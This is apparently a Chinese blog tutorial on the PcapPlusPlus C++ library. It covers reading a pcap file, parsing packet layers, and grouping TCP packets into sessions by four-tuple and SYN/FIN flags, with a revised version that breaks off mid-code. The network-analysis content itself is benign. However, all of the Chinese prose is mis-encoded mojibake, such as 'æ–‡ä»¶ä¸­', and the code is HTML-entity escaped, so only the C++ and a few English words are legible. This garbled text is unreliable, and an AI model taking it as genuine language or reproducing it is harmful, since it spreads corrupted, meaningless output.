æ–‡ä»¶ä¸­è¯»è¿›æ¥çš„ä¸€ä¸ªæ•°æ®åŒ…ï¼Œç»è¿‡è§£æï¼Œå¯ä»¥å°†è¿™ä¸ªæ•°æ®åŒ…æ‹†åˆ†æˆæˆ‘ä»¬ç†Ÿæ‚‰çš„è‹¥å¹²å±‚æ•°æ®ï¼PCPPçš„ä¸€ä¸ªç‰¹æ€§æ˜¯å®ƒä¸ä¿å­˜å¤šä¸ªå‰¯æœ¬ï¼Œè€Œåªæ˜¯åœ¨åŒä¸€ä¸ªæ•°æ®åŒ…ä¸Šæ ‡è®°å„å±‚åè®®çš„èµ·ç‚¹ï¼Œè¿™äº›èµ·ç‚¹å¯ä»¥ç”±ä¸Šä¸€å±‚è§£æç»“æœè®¿é—®åˆ°ã€‚\nç¤ºä¾‹ ä¾‹å¦‚è¿™ä¸ªå›¾ä¸­çš„è§£æç»“æœï¼Œé¦–å…ˆæ˜¯æ•°æ®é“¾è·¯å±‚çš„ Ethernet Layer ï¼Œå®ƒå¯ä»¥çœ‹åˆ°æ‰€æœ‰åŸå§‹æ•°æ®ï¼›ç”± Ethernet Layer å±‚æ‰£é™¤å®ƒçš„å¤´éƒ¨æ•°æ®ï¼Œå°±æ˜¯æ•´ä¸ª IPv4 å±‚çš„æ•°æ®ï¼›è€Œç”± IPv4 å±‚å†ç»§ç»­è§£æï¼Œå°±æ˜¯ UDP å±‚å•¦ï¼è¿™æ ·å±‚å±‚é€’æ¨ï¼Œå®é™…ä¸Šè·Ÿå­¦ä¹ è®¡ç®—æœºç½‘ç»œçš„æ—¶å€™å¯¹æ•°æ®åŒ…çš„è§£æé¡ºåºå·®ä¸å¤šã€‚\nPCPPæä¾›çš„æ•°æ®åŒ…è§£ææ–¹æ³•æœ‰ä¸¤ç§ï¼Œæˆ‘ä»¬åˆ†åˆ«æ¥çœ‹ã€‚\né¦–å…ˆè¿˜æ˜¯éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ª reader ï¼Œå¦‚æœä½ è¿˜è®°å¾—ç¬¬ä¸€ç« çš„å†…å®¹ï¼Œé‚£å°±å¾ˆç®€å•äº†ï¼š\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;IPv4Layer.h\u0026gt; #include \u0026lt;Packet.h\u0026gt; #include \u0026lt;PcapFileDevice.h\u0026gt; int main(int argc, char* argv[]) { // Part 1 // open a pcap file for reading pcpp::IFileReaderDevice* reader = pcpp::IFileReaderDevice::getReader(\u0026#34;test_file_1.pcap\u0026#34;); if (!reader) { std::cerr \u0026lt;\u0026lt; \u0026#34;Cannot determine reader for file type\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } if (!reader-\u0026gt;open()) { std::cerr \u0026lt;\u0026lt; \u0026#34;Cannot open input.pcap for reading\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } // read the first packet from the file pcpp::RawPacket rawPacket; if (!reader-\u0026gt;getNextPacket(rawPacket)) { std::cerr \u0026lt;\u0026lt; \u0026#34;Couldn\u0026#39;t read the first packet in the file\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } // ===== Code to write ===== reader-\u0026gt;close(); delete reader; return 0; } ä¸Šé¢æ˜¯ç¨‹åºçš„åŸºæœ¬æ¡†æ¶ï¼Œå·²ç»å†™å¥½äº†åˆ›å»ºReaderã€è¯»å–ç¬¬ä¸€ä¸ªæ•°æ®åŒ… rawPacket çš„éƒ¨åˆ†ã€‚æ¥ä¸‹æ¥çš„æ‰€æœ‰ä»£ç éƒ½è¿½åŠ åœ¨ Code to write é‚£å—åœ°æ–¹~\né¦–å…ˆéœ€è¦åˆ›å»ºä¸€ä¸ªè§£æåçš„æ•°æ®åŒ…ï¼š\n// parse the raw packet into a parsed packet pcpp::Packet parsedPacket(\u0026amp;rawPacket); åœ¨ä¸Šé¢çš„ä»‹ç»ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“è¿™ä¸ªè§£æåçš„æ•°æ®åŒ…æ˜¯ä¸€å±‚ä¸€å±‚çš„ç»“æ„ï¼Œæ¯ä¸€å±‚éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€å±‚çš„æŒ‡é’ˆï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå¾ªç¯æ¥éå†è¿™äº›å±‚ï¼š\n// first let\u0026#39;s go over the layers one by one and find out its type, its total length, its header length and its payload length for (pcpp::Layer* curLayer = parsedPacket.getFirstLayer(); curLayer != NULL; curLayer = curLayer-\u0026gt;getNextLayer()) { // Code to write } åœ¨è¿™ä¸ªå¾ªç¯ä¸­å‘¢ï¼Œ curLayer å°±æ˜¯å½“å‰è·å–åˆ°çš„å±‚äº†ï¼å‡å¦‚è¯´æˆ‘ä»¬éœ€è¦ä½¿ç”¨åˆ°TCPå±‚çš„ä¿¡æ¯ï¼Œé‚£å°±éœ€è¦ç”¨APIè·å–ä¸€ä¸‹å½“å‰å±‚çš„åè®®ï¼Œç„¶ååˆ¤æ–­ curLayer-\u0026gt;getProtocol() == pcpp::TCP ï¼ŒçœŸæ˜¯æœ‰ç‚¹éº»çƒ¦ï¼\nå¥½åœ¨PCPPä¸ºæˆ‘ä»¬æä¾›äº†ç¬¬äºŒç§è·å–åè®®å±‚çš„æ–¹æ³•ï¼š\npcpp::IPv4Layer* ipLayer = parsedPakcet.getLayerOfType\u0026lt;IPv4Layer\u0026gt;(); ç›´æ¥ä½¿ç”¨ getLayerOfType è¿™ä¸ªæ¥å£æ¥è·å–æˆ‘ä»¬æƒ³è¦çš„å±‚ï¼Œå¾ˆé…·ï¼\nåœ¨æˆ‘æ¥ä¸‹æ¥çš„åœºæ™¯ä¸­ï¼Œä½¿ç”¨åˆ°çš„æ˜¯ç½‘ç»œå±‚çš„IPåœ°å€å’Œä¼ è¾“å±‚çš„ç«¯å£ï¼Œé‚£ä¹ˆå°±åªéœ€è¦ï¼š\npcpp::TcpLayer* tcpLayer = parsedPakcet.getLayerOfType\u0026lt;TcpLayer\u0026gt;(); pcpp::IPv4Layer* ipLayer = parsedPakcet.getLayerOfType\u0026lt;IPv4Layer\u0026gt;(); æ–¹ä¾¿å¾—å¾ˆï¼\nå½“æˆ‘ä»¬è·å–åˆ°æŸä¸ªç‰¹å®šçš„å±‚ä¹‹åï¼Œå°±å¯ä»¥æ¥ä½¿ç”¨è¿™ä¸€å±‚çš„ä¿¡æ¯äº†ã€‚åœ¨VSç¯å¢ƒä¸­æœ‰è‡ªåŠ¨è¡¥å…¨ï¼Œä½¿ç”¨ tcpLayer-\u0026gt;getxxxxxx() è¿™æ ·çš„æ ¼å¼ï¼Œä¸€èˆ¬å°±èƒ½çœ‹åˆ°è¿™ä¸€å±‚åŒ…å«çš„ä¿¡æ¯ã€‚ä¾‹å¦‚æœ¬æ¬¡ä½¿ç”¨è¾ƒå¤šçš„æœ‰ï¼š\nIPv4Address\tipLayer-\u0026gt;getSrcIPv4Address(); uint16_t tcpLayer-\u0026gt;getSrcPort(); tcphdr*\ttcpLayer-\u0026gt;getTcpHeader()-\u0026gt;synFlag è¿™å‡ ä¸ªAPIä»åå­—ä¸Šå°±å¾ˆå®¹æ˜“çœ‹å‡ºå®ƒä»¬æ˜¯ä»€ä¹ˆä½œç”¨ï¼å¦‚æœæƒ³è¿›è¡Œæ›´å¤šçš„è§£æï¼Œå¯ä»¥çœ‹å‚è€ƒèµ„æ–™ [1] å’Œå‚è€ƒèµ„æ–™ [3] ğŸ˜ â€‹\nå¹¶ä¸æˆåŠŸçš„ä¼šè¯åˆ‡åˆ† æ‰€è°“ ä¼šè¯åˆ†å‰² ï¼Œå°±æ˜¯è¯´ç»™å‡ºä¸€ä¸ªå¾ˆå¤§çš„ pcap æ–‡ä»¶ï¼Œé‡Œé¢æœ‰è¶…çº§å¤šçš„æ•°æ®åŒ…ï¼Œæˆ‘ä»¬è¦æŠŠå®ƒæŒ‰ç…§ä¸€ä¸ªä¸ªçš„TCPä¼šè¯ï¼ˆæˆ–è€…å«TCPè¿æ¥ï¼Œwhateverï¼‰æ•´ç†å¥½ï¼\nè¿™ä¸€å·¥ä½œå¾ˆæœ‰æ„ä¹‰ï¼TCPä¼šè¯ä¸€èˆ¬æ˜¯æ•°æ®ä¼ è¾“çš„ä¸€ä¸ªåŸºæœ¬å•å…ƒï¼Œå®ƒä»¥ä¸‰æ¬¡æ¡æ‰‹å¼€å§‹ã€ä»¥å››æ¬¡æŒ¥æ‰‹ç»“æŸã€‚è­¬å¦‚ä»¥å‰çš„HTTPåè®®ï¼Œä¼ è¾“ä¸€ä¸ªæ–‡ä»¶å°±ä½¿ç”¨ä¸€ä¸ªTCPä¼šè¯ï¼Œå³ä½¿å¼•å…¥äº†é•¿è¿æ¥ï¼Œä¹Ÿæ˜¯åœ¨ä¸€ä¸ªç›¸å¯¹å®Œæ•´çš„è¯­å¢ƒä¸­ï¼ˆå¦‚ä¸€ä¸ªç½‘é¡µçš„åŠ è½½ï¼‰ä½¿ç”¨ä¸€æ¬¡TCPä¼šè¯ï¼Œæ‰€ä»¥ä¸€ä¸ªTCPä¼šè¯çš„èƒŒåå¯èƒ½å°±æ˜¯ç”¨æˆ·çš„ä¸€æ¬¡ç½‘ç»œè¡Œä¸ºï¼å¾ˆå¤šåŸºäºç½‘ç»œæµé‡çš„è¡Œä¸ºåˆ†ææŠ€æœ¯éƒ½æ˜¯åŸºäºTCPä¼šè¯çš„ï¼Œå­¦è€…ä»¬æå–TCPä¼šè¯çš„å„ç§ç‰¹å¾ä¿¡æ¯ï¼Œç„¶åä½¿ç”¨å„ç§æ¨¡å‹ï¼Œå¸Œæœ›æŠŠç½‘ç»œæµé‡è·Ÿå®ƒèƒŒåçš„ç”¨æˆ·è¡Œä¸ºå¯¹åº”èµ·æ¥ ğŸ˜¹ æˆ‘ä»¬ä»Šå¤©è¿˜åšä¸åˆ°è¿™ä¹ˆå¤šå•¦ï¼Œä½†æ˜¯ä» pcap æ–‡ä»¶ä¸­æ•´ç†å‡ºä¸€ä¸ªä¸ªTCPä¼šè¯æ¥ï¼Œè¿˜æ˜¯å¯ä»¥è¯•è¯•çš„~\nå®éªŒç›®æ ‡ï¼šæ•´ç†å‡ºä¼šè¯çš„å¼€å§‹æ—¶é—´å’Œç»“æŸæ—¶é—´ï¼Œå¯ä»¥é¡ºä¾¿è®¡ç®—ä¸€ä¸‹æ—¶é•¿ ã€‚\nAll rightï¼Ÿå…ˆè®²æ€è·¯ï¼Œå†è¯´ä¸è¶³ï¼Œæœ€åæ…¢æ…¢æ”¹è¿›ã€‚\næˆ‘åŸºæœ¬çš„æ€è·¯æ˜¯ä½¿ç”¨ä¸€ä¸ª å››å…ƒç»„ æ¥ä¿å­˜è¿æ¥ä¿¡æ¯ã€‚ç†Ÿæ‚‰TCPçš„æœ‹å‹åº”è¯¥çŸ¥é“ï¼Œä¸€ä¸ªTCPè¿æ¥å¯ä»¥ç”± (SrcIP, DstIP, SrcPort, DstPort) è¿™ä¸ªå…ƒç»„å”¯ä¸€ç¡®å®šï¼Œå…¶å®å°±æ˜¯ä¸¤ç«¯çš„ Socket å•Šï¼\nè¿™ä¹ˆä¸€ä¸ªå…ƒç»„æ€ä¹ˆå‚¨å­˜å‘¢ï¼Ÿæˆ‘çš„åšæ³•æ˜¯è¿›è¡Œä¸€ä¸ªç®€å•çš„å­—ç¬¦ä¸²æ‹¼æ¥ï¼š\nstring keyTuple = ipLayer-\u0026gt;getSrcIPv4Address().toString() + \u0026#34; \u0026#34; + ipLayer-\u0026gt;getDstIPv4Address().toString() + \u0026#34; \u0026#34; + to_string(tcpLayer-\u0026gt;getSrcPort()) + \u0026#34; \u0026#34; + to_string(tcpLayer-\u0026gt;getDstPort()); æˆ‘ä»¬è¦åšçš„æ˜¯ æ•´ç†å‡ºä¼šè¯çš„å¼€å§‹æ—¶é—´å’Œç»“æŸæ—¶é—´ ï¼Œè¿˜è®°å¾—å—ï¼Ÿ\næˆ‘æœ€åˆçš„æƒ³æ³•æ˜¯ï¼šå¯¹æ¯ä¸ªæ•°æ®åŒ…è¿›è¡Œåˆ†æï¼Œå¦‚æœæ•°æ®åŒ…ä¸­åŒ…å« SYN ï¼Œè¯´æ˜å®ƒæ˜¯ä¼šè¯çš„å¼€å§‹ï¼Œæ”¾å…¥ä¸€ä¸ª map ä¸­ï¼›å¦‚æœæ•°æ®åŒ…ä¸­åŒ…å« FIN ï¼Œè¯´æ˜å®ƒæ˜¯ä¼šè¯çš„ç»“æŸï¼Œä¾æ®è¿™ä¸ªæ•°æ®åŒ…çš„å››å…ƒç»„ä» map ä¸­è·å–å¼€å§‹æ—¶é—´ï¼Œç„¶åä½¿ç”¨å½“å‰æ•°æ®åŒ…çš„æ—¶é—´ä½œä¸ºç»“æŸæ—¶é—´ï¼Œæ‰“å°ï¼\næ€»çš„ä»£ç ä¸ºï¼š\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;IPv4Layer.h\u0026gt; #include \u0026lt;TcpLayer.h\u0026gt; #include \u0026lt;Packet.h\u0026gt; #include \u0026lt;PcapFileDevice.h\u0026gt; #include \u0026lt;set\u0026gt; #include \u0026lt;map\u0026gt; #include \u0026lt;ctime\u0026gt; #include \u0026lt;cstdlib\u0026gt; #include \u0026lt;iomanip\u0026gt; using namespace pcpp; using namespace std; #define MY_FORMAT setw(18) \u0026lt;\u0026lt; setiosflags(ios::left) IFileReaderDevice* openFileReader(string fileName) { IFileReaderDevice* openedReader = IFileReaderDevice::getReader(fileName); if (!openedReader) { cerr \u0026lt;\u0026lt; \u0026#34;Cannot determine reader for file type\u0026#34; \u0026lt;\u0026lt; endl; exit(EXIT_FAILURE); } if (!openedReader-\u0026gt;open()) { cerr \u0026lt;\u0026lt; \u0026#34;Cannot open input.pcap for reading\u0026#34; \u0026lt;\u0026lt; endl; exit(EXIT_FAILURE); } return openedReader; } void printSplitedTuple(string s) { int prevFind = -1; int nowFind; while ((nowFind = s.find(\u0026#34; \u0026#34;, prevFind + 1)) != string::npos) { cout \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; s.substr(prevFind + 1, nowFind - prevFind); prevFind = nowFind; } cout \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; s.substr(prevFind + 1); } int main(int argc, char* argv[]) { // open a pcap file for reading string pcapFile = \u0026#34;test_file_1.pcap\u0026#34;; IFileReaderDevice* reader = openFileReader(pcapFile); if (!reader-\u0026gt;setFilter(\u0026#34;tcp\u0026#34;)) { cerr \u0026lt;\u0026lt; \u0026#34;Cannot set filter for file reader\u0026#34; \u0026lt;\u0026lt; endl; exit(EXIT_FAILURE); } RawPacket rawPacket; multimap\u0026lt;string, timespec\u0026gt; sessionMap; auto BEGIN = clock(); while (reader-\u0026gt;getNextPacket(rawPacket)) { Packet parsedPakcet(\u0026amp;rawPacket); TcpLayer* tcpLayer = parsedPakcet.getLayerOfType\u0026lt;TcpLayer\u0026gt;(); IPv4Layer* ipLayer = parsedPakcet.getLayerOfType\u0026lt;IPv4Layer\u0026gt;(); string keyTuple = ipLayer-\u0026gt;getSrcIPv4Address().toString() + \u0026#34; \u0026#34; + ipLayer-\u0026gt;getDstIPv4Address().toString() + \u0026#34; \u0026#34; + to_string(tcpLayer-\u0026gt;getSrcPort()) + \u0026#34; \u0026#34; + to_string(tcpLayer-\u0026gt;getDstPort()); if (tcpLayer-\u0026gt;getTcpHeader()-\u0026gt;synFlag == 1) { sessionMap.insert(pair\u0026lt;string, timespec\u0026gt;(keyTuple, rawPacket.getPacketTimeStamp())); } if (tcpLayer-\u0026gt;getTcpHeader()-\u0026gt;finFlag == 1) { auto sessionStart = sessionMap.find(keyTuple); if (sessionStart != sessionMap.end()) { cout \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;Src\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;Dst\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;SrcPort\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;DstPort\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;Start\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;End\u0026#34;\u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;Duration\u0026#34; \u0026lt;\u0026lt; endl; printSplitedTuple(keyTuple); double startTime = sessionStart-\u0026gt;second.tv_sec + (double)sessionStart-\u0026gt;second.tv_nsec / 1e9; double endTime = rawPacket.getPacketTimeStamp().tv_sec + (double)rawPacket.getPacketTimeStamp().tv_nsec / 1e9; cout \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; sessionStart-\u0026gt;second.tv_sec \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; rawPacket.getPacketTimeStamp().tv_sec \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; setprecision(5) \u0026lt;\u0026lt; (endTime - startTime) \u0026lt;\u0026lt; endl; sessionMap.erase(sessionStart); } } } auto END = clock(); cout \u0026lt;\u0026lt; \u0026#34;Total time: \u0026#34; \u0026lt;\u0026lt; double(END - BEGIN) / CLK_TCK * 1000 \u0026lt;\u0026lt; \u0026#34;ms.\u0026#34; \u0026lt;\u0026lt; endl; reader-\u0026gt;close(); delete reader; return 0; } ä¸Šé¢çš„ä»£ç ä½¿ç”¨äº† rawPacket.getPacketTimestamp() æ¥è·å–æ•°æ®åŒ…çš„æ—¶é—´æˆ³ï¼Œè¿”å›ç»“æœæ˜¯ä¸€ä¸ª timespec ç±»å‹ï¼è¿™ä¸ªç±»å‹è¡¨ç¤ºä»æ—¥å†èµ·ç‚¹åˆ°ç°åœ¨æ‰€ç»è¿‡çš„ç§’æ•°ï¼Œå®ƒçš„ç¬¬ä¸€éƒ¨åˆ†æ˜¯ ç§’ ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯ çº³ç§’ ï¼Œæˆ‘ä½¿ç”¨äº† ç§’ æ¥æ‰“å°ä¼šè¯å¼€å§‹æ—¶é—´å’Œç»“æŸæ—¶é—´ï¼Œä½¿ç”¨äº† çº³ç§’ æ¥è®¡ç®—ä¼šè¯æŒç»­æ—¶é—´ã€‚\næ­¤å¤–ï¼Œä¸ºäº†è¾“å‡ºç»“æœçš„ç¾è§‚ï¼Œæˆ‘å®šä¹‰äº†ä¸€ä¸ª MY_FORMAT å®ï¼Œå°†è¾“å‡ºçš„å­—ç¬¦ä¸²æŒ‡å®šä¸º 18 ä¸ªå®½åº¦ï¼Œæ–¹ä¾¿å¯¹é½ã€‚\nè¾“å‡ºç»“æœ è¿™æ¬¡çš„è¿è¡ŒèŠ±äº†5ç§’å¤šï¼ç»“æœçœ‹ç€è›®å‰å®³ï¼Œå…¶å®é—®é¢˜æœ‰å¾ˆå¤š ğŸ˜¢ è¿™äº›é—®é¢˜æ˜¯åœ¨æˆ‘åŸºæœ¬ä¸Šå®Œæˆäº†è¿™ä¸ªç¨‹åºä¹‹åï¼Œé€æ¸æ„è¯†åˆ°çš„ã€‚\nå…ƒç»„çš„è¡¨ç¤ºé—®é¢˜ é¦–å…ˆæ˜¯é‚£ä¸ªå››å…ƒç»„çš„é—®é¢˜ã€‚æˆ‘ä»¬è¯´ä¸€ä¸ªTCPä¼šè¯æ˜¯ç”±ä¸€ä¸ªå…ƒç»„ç¡®å®šçš„ï¼Œè¿™è‡ªç„¶æ˜¯æ²¡æœ‰é”™ï¼Œä½†æ˜¯åœ¨ç¼–ç¨‹å®ç°ä¸­ï¼Œæˆ‘æŠŠè¿™å››ä¸ªå…ƒç´ ç®€å•åœ°åšäº†å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè¿™å°±å¸¦æ¥é—®é¢˜äº†ï¼æœ¬æ¥ (SrcIP, DstIP, SrcPort, DstPort) è¿™å››ä¸ªå…ƒç´ çš„é¡ºåºæ˜¯å¯ä»¥å€’æ¢çš„ï¼Œä¹Ÿå°±æ˜¯å®ƒè·Ÿ (DstIP, SrcIP, DstPort, SrcPort) æ˜¯åŒä¸€ä¸ªä¸œè¥¿å•Šï¼æ›´åŠ å…·ä½“åœ°è¯´ï¼Œæœ¬æ¥ç”± 192.168.0.102 å‘å¾€ 1.1.1.1 çš„ä¼šè¯æ˜¯åŒå‘çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ (192.168.0.102, 1.1.1.1, 4321, 443) è¿™ä¹ˆä¸€ä¸ªå…ƒç»„è¡¨ç¤ºä¸»æœºå‘å¾€æœåŠ¡å™¨çš„æ•°æ®ï¼Œè€Œ (1.1.1.1, 192.168.0.102, 443, 4321) è¡¨ç¤ºçš„æ˜¯æœåŠ¡å™¨å‘å¾€ä¸»æœºçš„æ•°æ®ï¼Œè¿™ä¸¤ä¸ªå…ƒç»„è¡¨ç¤ºçš„æ˜¯åŒä¸€ä¸ªä¼šè¯ï¼è€Œæˆ‘ æ„šè ¢åœ° åšäº†å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè€Œä¸”ç”¨è¿™ä¸ªæ‹¼æ¥åçš„å­—ç¬¦ä¸²æ¥ä½œä¸º map çš„ key ã€‚è¿™ç§ key è¡¨ç¤ºå‡ºæ¥çš„ä¸œè¥¿æ ¹æœ¬å°±ä¸å…¨å•Šï¼Ÿï¼ä¼šä½¿å¾—æˆ‘ä»¬åœ¨å–å¾—ä¸€ä¸ª FIN åŒ…æ—¶ï¼Œåªèƒ½æ‰¾åˆ° åŒå‘çš„ SYN åŒ…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æ•´ç†å‡ºæ¥çš„ä¼šè¯ï¼Œåªèƒ½æ˜¯ ç”±ä¸»æœºå‘èµ·ã€ç”±ä¸»æœºæ–­å¼€ æˆ–è€…æ˜¯ ç”±æœåŠ¡å™¨å‘èµ·ã€ç”±æœåŠ¡å™¨æ–­å¼€ çš„ä¼šè¯ï¼Œè‡³äº ç”±ä¸»æœºå‘èµ·ã€ç”±æœåŠ¡å™¨æ–­å¼€ çš„ä¼šè¯ï¼Œæˆ–è€… ç”±æœåŠ¡å™¨å‘èµ·ã€ç”±ä¸»æœºæ–­å¼€ çš„ä¼šè¯ï¼Œå°±æ•´ç†ä¸åˆ°äº†ã€‚\nä¼šè¯èµ·æ­¢çš„é—®é¢˜ å³ä¾¿è§£å†³äº†å…ƒç»„çš„è¡¨ç¤ºé—®é¢˜ï¼Œè¿˜æœ‰ä¼šè¯èµ·æ­¢çš„é—®é¢˜æ²¡æœ‰è€ƒè™‘åˆ°ã€‚\nTCPçš„ä¸‰æ¬¡æ¡æ‰‹å’Œå››æ¬¡æŒ¥æ‰‹ä¸­ï¼Œä¼šäº§ç”Ÿ ä¸¤ä¸ªSYNåŒ…ã€ä¸¤ä¸ªFINåŒ… ï¼è¿™æ˜¯æˆ‘åœ¨ç¼–ç¨‹è¿‡ç¨‹ä¸­é—æ¼çš„çŸ¥è¯†ç‚¹ï¼Œååº”è¿‡æ¥ä¹‹åï¼Œå¤´ç—›ä¸å·²â€¦â€¦\nä¼šè¯çš„èµ·æ­¢ï¼Œåº”è¯¥è¡¨ç¤ºä¸ºç¬¬ä¸€ä¸ª SYN å’Œæœ€åä¸€ä¸ª FIN ï¼Œç¬¬ä¸€ä¸ª SYN æ˜¯ä¸å« ack çš„ï¼Œè€Œæœ€åä¸€ä¸ª FIN æ˜¯åœ¨åŒä¸€ä¸ªå…ƒç»„ä¸‹å‡ºç°çš„ç¬¬äºŒä¸ª FIN ã€‚\nè¿™æ ·çš„ç®—æ³• ä¸è€ƒè™‘è¶…æ—¶é‡ä¼ çš„æƒ…å†µã€ä¸è€ƒè™‘æœ€åä¸€ä¸ª ack çš„ä¼ è¾“ã€ä¸è€ƒè™‘è¿æ¥æ–­å¼€ä¹‹å‰çš„ 2MSL ç­‰å¾… ã€‚\næ„Ÿè§‰è¯¯å·®æŒºå¤§çš„æ ·å­ï¼Œä¸è¿‡è¿™æ ·çš„è¯¯å·®ä¼šä½œç”¨åˆ°æ¯ä¸€ä¸ªä¼šè¯ä¸Šï¼Œç›¸å¯¹æ¥è¯´æ˜¯å¯ä»¥æ¥å—çš„ã€‚\næ¯”è¾ƒæˆåŠŸçš„ä¼šè¯åˆ‡åˆ† åœ¨ä¸Šé¢éƒ¨åˆ†çš„ä»£ç å®£å‘Šå¤±è´¥åï¼Œæˆ‘ç¿»çœ‹PCPPçš„ ç¤ºä¾‹åº”ç”¨ ï¼Œæ„å¤–åœ°å‘ç°äº† PcapSplitter è¿™ä¸ªå¥½ä¸œè¥¿ï¼Œä½œè€…å·²ç»åˆæ­¥å®ç°äº†æŒ‰ç…§ä¼šè¯åˆ‡åˆ† pcap æ–‡ä»¶çš„åŠŸèƒ½ã€‚\nä¸è¿‡ï¼Œä½œè€…çš„ä»£ç åªèƒ½ä½œä¸ºå‚è€ƒï¼Œå› ä¸ºä»–æ˜¯å°†ä¸€ä¸ªå¤§çš„ pcap æ–‡ä»¶æŒ‰ç…§ä¸€å®šè§„åˆ™åˆ‡åˆ†ä¸ºè‹¥å¹²å°çš„ pcap æ–‡ä»¶ï¼Œè·Ÿæˆ‘çš„ä¸»è¦éœ€æ±‚ä¸å¤ªä¸€è‡´ã€‚\nå½“æˆ‘é˜…è¯» ConnectionSplitter.h è¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œå‘ç°äº†ä¸€ä¸ªé‡è¦çš„å‡½æ•°ï¼š hash5Tuple() ã€‚\næœ‰æ²¡æœ‰æé”™ï¼Ÿï¼æäº†å¤§åŠå¤©çš„ç”¨å››å…ƒç»„æ¥è¡¨ç¤ºä¸€ä¸ªä¼šè¯ï¼Œç»“æœè¿™ä¸ªåº“è‡ªå·±å°±èƒ½å¤Ÿå¤„ç†å…ƒç»„å“ˆå¸Œï¼Ÿè€Œä¸”å‚æ•°ç®€å•å¾—è¦æ­»ï¼Œä¼ å…¥ä¸€ä¸ª parsedPacket å³å¯ã€‚\nè¡Œå­ï¼Œå°±ç”¨è¿™ä¸ªå‡½æ•°æ¥æ›¿ä»£ä¹‹å‰çš„æ„šè ¢çš„å…ƒç»„è¡¨ç¤ºæ–¹å¼ï¼ŒåŒæ—¶å®Œå–„ä¸€ä¸‹ä¼šè¯èµ·æ­¢çš„åˆ¤å®šæ–¹æ³•ï¼Œæ”¹å†™ä¸€ä¸‹ä¼šè¯åˆ‡åˆ†ä»£ç ï¼š\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;IPv4Layer.h\u0026gt; #include \u0026lt;TcpLayer.h\u0026gt; #include \u0026lt;Packet.h\u0026gt; #include \u0026lt;PcapFileDevice.h\u0026gt; #include \u0026lt;PacketUtils.h\u0026gt; #include \u0026lt;set\u0026gt; #include \u0026lt;map\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;ctime\u0026gt; #include \u0026lt;cstdlib\u0026gt; #include \u0026lt;iomanip\u0026gt; using namespace pcpp; using namespace std; #define MY_FORMAT setw(18) \u0026lt;\u0026lt; setiosflags(ios::left) IFileReaderDevice* openFileReader(string fileName) { IFileReaderDevice* openedReader = IFileReaderDevice::getReader(fileName); if (!openedReader) { cerr \u0026lt;\u0026lt; \u0026#34;Cannot determine reader for file type\u0026#34; \u0026lt;\u0026lt; endl; exit(EXIT_FAILURE); } if (!openedReader-\u0026gt;open()) { cerr \u0026lt;\u0026lt; \u0026#34;Cannot open input.pcap for reading\u0026#34; \u0026lt;\u0026lt; endl; exit(EXIT_FAILURE); } return openedReader; } int main(int argc, char* argv[]) { // open a pcap file for reading string pcapFile = \u0026#34;test_file_1.pcap\u0026#34;; IFileReaderDevice* reader = openFileReader(pcapFile); if (!reader-\u0026gt;setFilter(\u0026#34;tcp\u0026#34;)) { cerr \u0026lt;\u0026lt; \u0026#34;Cannot set filter for file reader\u0026#34; \u0026lt;\u0026lt; endl; exit(EXIT_FAILURE); } RawPacket rawPacket; map\u0026lt;uint32_t, timespec\u0026gt; sessionMap; map\u0026lt;uint32_t, int\u0026gt; finCount; int outputCount = 0; auto BEGIN = clock(); while (reader-\u0026gt;getNextPacket(rawPacket)) { Packet parsedPakcet(\u0026amp;rawPacket); TcpLayer* tcpLayer = parsedPakcet.getLayerOfType\u0026lt;TcpLayer\u0026gt;(); IPv4Layer* ipLayer = parsedPakcet.getLayerOfType\u0026lt;IPv4Layer\u0026gt;(); uint32_t keyTuple = hash5Tuple(\u0026amp;parsedPakcet); if (tcpLayer-\u0026gt;getTcpHeader()-\u0026gt;synFlag == 1 \u0026amp;\u0026amp; tcpLayer-\u0026gt;getTcpHeader()-\u0026gt;ackFlag == 0) { sessionMap[keyTuple] = rawPacket.getPacketTimeStamp(); } if (tcpLayer-\u0026gt;getTcpHeader()-\u0026gt;finFlag == 1 || tcpLayer-\u0026gt;getTcpHeader()-\u0026gt;rstFlag == 1) { if (finCount.find(keyTuple) != finCount.end()) { finCount[keyTuple]++; } else { finCount[keyTuple] = 1; } auto sessionStart = sessionMap.find(keyTuple); if (finCount[keyTuple] == 2 \u0026amp;\u0026amp; sessionStart != sessionMap.end()) { cout \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;Src\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;Dst\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;SrcPort\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;DstPort\u0026#34; \u0026lt;\u0026lt; MY_FORMAT 